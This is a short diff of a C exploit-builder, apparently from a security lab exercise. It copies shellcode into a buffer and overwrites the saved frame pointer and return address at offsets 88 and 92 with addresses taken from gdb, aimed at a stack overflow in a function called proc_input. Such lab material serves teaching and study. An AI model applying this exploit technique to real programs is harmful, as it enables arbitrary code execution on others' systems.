@@ -29,15 +29,15 @@ int main() {
   FILE *fp;
 
   memset(buf ,'a', 100);
-//  memcpy(buf, shellcode, 75);
+  memcpy(buf, shellcode, 75);
 
 printf("\n shellcode[0-74]=\n"); for (i=0; i<75;i++){printf("%02x ",shellcode[i]);}
 
 for (i=0; i<75;i++){buf[i]=shellcode[i];}
 printf("\n buf[0-74]=\n"); for (i=0; i<75;i++){printf("%02x ",buf[i]);}
 
-  *((unsigned*)(&buf[88])) = 0xffffdb88;  // put x/1xw $ebp from proc_input here, where 88 = $ebp - &buf
-  *((unsigned*)(&buf[92])) = 0xffffda70;  // put &buf from proc_input here, where 92 = $ebp -&buf +4
+  *((unsigned*)(&buf[88])) = 0xffffdaf8;  // put x/1xw $ebp from proc_input here, where 88 = $ebp - &buf
+  *((unsigned*)(&buf[92])) = 0xffffd9e0;  // put &buf from proc_input here, where 92 = $ebp -&buf +4
 
 printf("\n buf[88-99]=\n"); for (i=88; i<100;i++){printf("%02x ",buf[i]);}
 
